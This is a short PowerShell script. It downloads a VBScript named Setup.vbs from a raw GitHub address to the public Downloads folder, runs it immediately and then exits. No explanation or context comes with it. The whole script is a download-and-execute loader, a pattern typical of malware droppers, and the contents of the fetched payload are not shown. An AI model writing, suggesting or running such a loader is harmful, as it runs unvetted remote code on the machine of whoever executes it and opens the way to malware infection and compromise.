Invoke-WebRequest -Uri "https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Setup.vbs" -OutFile "C:\Users\Public\Downloads\Setup.vbs"
Start-Process -FilePath "C:\Users\Public\Downloads\Setup.vbs"
exit

